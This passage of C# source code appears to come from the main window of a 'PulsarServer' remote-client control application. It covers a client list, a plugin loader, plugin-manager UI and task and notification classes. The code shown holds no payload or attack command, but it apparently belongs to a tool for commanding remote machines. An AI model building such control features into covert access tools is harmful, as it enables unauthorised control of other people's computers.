                _searchResultsLabel.Text = $"Showing all {totalCount} clients";
            }
            else
            {
                _searchResultsLabel.Text = $"Showing {visibleCount} of {totalCount} clients";
            }
        }

        #endregion

        #region Plugin System

        private void InitializePlugins()
        {
            try
            {
                _serverContext = new ServerContext(this);
                _pluginManager = new PluginManager(_serverContext);
                _pluginManager.PluginsChanged += OnPluginsChanged;
                
                var pluginsDir = Path.Combine(Application.StartupPath, "Plugins");
                if (!Directory.Exists(pluginsDir))
                {
                    Directory.CreateDirectory(pluginsDir);
                }
                
                _pluginManager.LoadFrom(pluginsDir);
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error initializing plugins: {ex.Message}");
            }
        }

        private void OnPluginsChanged(object sender, EventArgs e)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<object, EventArgs>(OnPluginsChanged), sender, e);
                return;
            }
            
            UpdatePluginStatus();
        }

        private void UpdatePluginStatus()
        {
            try
            {
                var pluginCount = _pluginManager?.Plugins.Count ?? 0;
                // Update UI to show plugin count or status
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error updating plugin status: {ex.Message}");
            }
        }

        private void UpdatePluginManagerWindow()
        {
            if (_pluginManagerForm?.IsDisposed == false)
            {
                _pluginManagerForm.Refresh();
            }
        }

        private void pluginManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (_pluginManagerForm?.IsDisposed != false)
                {
                    _pluginManagerForm = new FrmPluginManager(_pluginManager);
                }
                _pluginManagerForm.Show();
                _pluginManagerForm.BringToFront();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening plugin manager: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion Plugin System
    }

    public class NotificationEntry
    {
        public string Client { get; set; }
        public DateTime Timestamp { get; set; }
        public string Event { get; set; }
        public string Parameter { get; set; }
        public bool IsRead { get; set; }
    }

    public class AutoTask
    {
        public string Title { get; set; } = string.Empty;
        public string Param1 { get; set; } = string.Empty;
        public string Param2 { get; set; } = string.Empty;
        public string Param3 { get; set; } = string.Empty;
        public string Param4 { get; set; } = string.Empty;
        public string Identifier { get; set; } = string.Empty;
        public AutoTaskExecutionMode ExecutionMode { get; set; } = AutoTaskExecutionMode.OncePerClient;
    }

    #endregion AutoTaskStuff

    public class ClientInfo
    {
        public string ClientId { get; set; }
        public string Nickname { get; set; }
    }

    public sealed class ServerContext : IServerContext
    {
        private readonly FrmMain _mainForm;

        public ServerContext(FrmMain mainForm)
        {
            _mainForm = mainForm;
        }

        public Form MainForm => _mainForm;
        public PulsarServer Server => _mainForm.ListenServer;

        public void Log(string message)
        {
            if (_mainForm.InvokeRequired)
            {
                _mainForm.Invoke(new Action<string>(Log), message);
                return;
            }
            // Add to log or console output
            System.Diagnostics.Debug.WriteLine($"[Plugin] {message}");
        }

        public void AddClientContextMenuItem(string text, Action<IReadOnlyList<Client>> onClick)
        {
            if (_mainForm.InvokeRequired)
            {
                _mainForm.Invoke(new Action<string, Action<IReadOnlyList<Client>>>(AddClientContextMenuItem), text, onClick);
                return;
            }
            // Implementation for adding context menu items
        }

        public void AddClientContextMenuItem(string category, string text, Icon icon, Action<IReadOnlyList<Client>> onClick)
        {
            if (_mainForm.InvokeRequired)
            {
                _mainForm.Invoke(new Action<string, string, Icon, Action<IReadOnlyList<Client>>>(AddClientContextMenuItem), category, text, icon, onClick);
                return;
            }
            // Implementation for adding categorized context menu items
        }

        public void ClearPluginMenuItems()
        {
            if (_mainForm.InvokeRequired)
            {
                _mainForm.Invoke(new Action(ClearPluginMenuItems));
                return;
            }
            // Implementation for clearing plugin menu items
        }
    }
}